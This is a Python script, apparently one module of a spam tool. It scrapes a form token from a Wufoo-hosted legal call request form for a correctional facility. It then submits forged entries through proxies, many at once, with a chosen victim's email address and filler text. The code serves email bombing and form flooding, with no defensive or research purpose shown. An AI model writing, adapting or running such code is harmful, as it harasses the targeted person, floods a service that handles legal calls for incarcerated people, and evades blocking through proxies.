import re
from os.path import basename

import requests

from module import Spam


def get(session: requests.Session):
    headers = {
        'authority': 'odoc.wufoo.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        # 'cookie': 'ep202=dsIIpL0lwuMNvJqjw+KG4xBhNGc=; submission-stritch-220=submitted; submission-kaffessamusic-2=submitted; submission-generalbaptist-1=submitted; _splunk_rum_sid=%7B%22id%22%3A%228b1fdc89008cf6438dcb27650bcc5708%22%2C%22startTime%22%3A1676390008265%7D; ep201=WyjRUIFRcr+AfbHPh/JTjgzSSbw=; endpage=%7B%22Username%22%3A%22odoc%22%2C%22FormHash%22%3A%22zcb3ta91cupq8e%22%7D; submission-odoc-1=submitted; wuentry=q-126-z-1399643',
        'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    }

    response = session.get('https://odoc.wufoo.com/forms/legal-call-request-form/', headers=headers)
    return response


def post(session: requests.Session, id_stamp, text, target):
    headers = {
        'authority': 'odoc.wufoo.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryWZiwAttMwq68ne3R',
        # 'cookie': 'ep202=dsIIpL0lwuMNvJqjw+KG4xBhNGc=; submission-stritch-220=submitted; submission-kaffessamusic-2=submitted; endpage=%7B%22Username%22%3A%22generalbaptist%22%2C%22FormHash%22%3A%22z1qio9xn1yy0k8e%22%7D; submission-generalbaptist-1=submitted; _splunk_rum_sid=%7B%22id%22%3A%228b1fdc89008cf6438dcb27650bcc5708%22%2C%22startTime%22%3A1676390008265%7D; ep201=WyjRUIFRcr+AfbHPh/JTjgzSSbw=',
        'origin': 'https://odoc.wufoo.com',
        'referer': 'https://odoc.wufoo.com/forms/legal-call-request-form/',
        'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    }

    data = '------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field6-1"\r\n\r\n12\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field6-2"\r\n\r\n12\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field6"\r\n\r\n1999\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field3"\r\n\r\nCoffee Creek Correctional Facility- Male Intake (CCIC)\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field46"\r\n\r\ntest\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field47"\r\n\r\ntest\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field48"\r\n\r\ntest\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field21"\r\n\r\n1212\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field7-1"\r\n\r\n12\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field7-2"\r\n\r\n12\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field7"\r\n\r\n1999\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field8-1"\r\n\r\n12\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field8-2"\r\n\r\n12\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field8"\r\n\r\n1999\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field37"\r\n\r\n1 (within 1 to 2 Business Days)\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field10"\r\n\r\n30 minutes\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field43"\r\n\r\ntest\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field44"\r\n\r\ntest\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field50"\r\n\r\ntest\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field55"\r\n\r\nYes\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field155"\r\n\r\ntest\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field156"\r\n\r\ntest\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field157"\r\n\r\ntest\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field22"\r\n\r\ntest\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field23"\r\n\r\ntest\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field26"\r\n\r\n123\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field26-1"\r\n\r\n123\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field26-2"\r\n\r\n1232\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field27"\r\n\r\ntest\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="Field28"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="currentPage"\r\n\r\nqy7LpJdICBfRLfZTtwuBe7Su8NllyK63O3ImDxiMV33z8k=\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="saveForm"\r\n\r\nSubmit\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="comment"\r\n\r\n\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="idstamp"\r\n\r\nidstamp_field\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="encryptedPassword"\r\n\r\n\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="stats"\r\n\r\n{"errors":1,"startTime":2763905,"endTime":2806794,"referer":"https://odoc.wufoo.com/forms/legal-call-request-form/"}\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R\r\nContent-Disposition: form-data; name="clickOrEnter"\r\n\r\nclick\r\n------WebKitFormBoundaryWZiwAttMwq68ne3R--\r\n'
    data = data.replace('idstamp_field', id_stamp).replace('test', text).replace('wezxasqw@gmail.com', target).encode()

    response = session.post('https://odoc.wufoo.com/forms/legal-call-request-form/', headers=headers,
                            data=data)
    return response


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        s = requests.Session()
        s.proxies = self.get_proxies()
        get_resp = get(s)
        pattern = re.compile('(?<=name="idstamp" value=").*(?=" >)')
        idstamp = pattern.findall(get_resp.text)
        if not idstamp:
            return
        text = self.get_text()
        post_resp = post(s, idstamp[0], text, target)
        return post_resp


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), 'Thank you.')
    res = spam.send_post()
    if res:
        spam.run_concurrently(60)


if __name__ == '__main__':
    main()
